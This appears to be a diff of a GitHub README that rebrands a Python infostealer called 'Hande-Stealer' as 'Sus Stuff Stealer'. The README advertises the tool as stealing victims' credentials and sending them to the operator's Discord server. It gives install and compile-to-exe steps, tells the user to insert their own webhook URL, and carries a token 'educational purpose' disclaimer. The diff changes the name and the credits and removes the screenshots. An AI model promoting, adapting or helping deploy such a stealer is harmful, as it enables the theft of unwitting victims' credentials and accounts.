@@ -1,4 +1,4 @@
-# Hande-Stealer ::
+# Sus Stuff Stealer ::
 ## This ia an simple and powerful stealer that steals victim credentials and send to your discord server...
 ## Features :
 ### This File  Steals --->
@@ -24,17 +24,15 @@
     pip install requests
  ```
 ## Compile To Exe 
-### Run compile.bat to convert file to exe...The size of exe file will be quite larger . If you need to produce smaller file then use compile_lite.bat ...But The screenshot option is removed in lighter version
+### Run compile.bat to convert file to exe...
 
 ## Note :
-### Dont Forget to Change this with your webhook url >>>> https://github.com/swagkarna/Hande-Stealer/blob/fb15385349e7482baa46681216e137b9b745e33b/Hande-stealer.pyw#L27
+### Dont Forget to Change this with your webhook url >>>> https://github.com/cezzie-kun/sus-stuff-stealer/blob/ed49f14c84d3dfea3a93648526557b29bcfc7ea0/sus-stuff-stealer.pyw#L27C1-L27C1
 
 ## ScreenShots :::
 ### Bots Sending Credentials to your Discord Server !!!!
-<img src="https://raw.githubusercontent.com/swagkarna/Hande-Stealer/main/1.png"></img>
-<img src="https://raw.githubusercontent.com/swagkarna/Hande-Stealer/main/Screenshot%20(58).png"></img>
-<img src="https://raw.githubusercontent.com/swagkarna/Hande-Stealer/main/img%20(2).png"></img>
+
 # Discalimer ::
 ### Use this only for educational Purpose...I am not responsibe for your actions...Stay Safe !!! Stay Legal !!!
 ## Credits ::
-### Thanks to Vazzy.... , and Kram.. 
+### Thanks to syl.... , and dazai.. 
